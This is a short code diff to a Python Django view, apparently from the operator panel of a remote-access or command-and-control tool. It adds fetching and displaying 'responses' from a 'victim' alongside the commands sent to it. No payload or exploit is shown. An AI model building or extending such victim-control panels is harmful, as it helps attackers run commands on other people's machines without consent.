@@ -22,6 +22,8 @@ def control(response,id:int):
             data = {"victim":victim["data"][0],"commands":commands,"command_sent":bool(d)}
     else:
         if victim["Status"]:
-            data = {"victim":victim["data"][0],"commands":commands}
+            responses = Api.get_response(id=id)
+            print(responses["data"])
+            data = {"victim":victim["data"][0],"commands":commands,"responses":responses["data"]}
     return render(response,"landing/control.html",data)
 
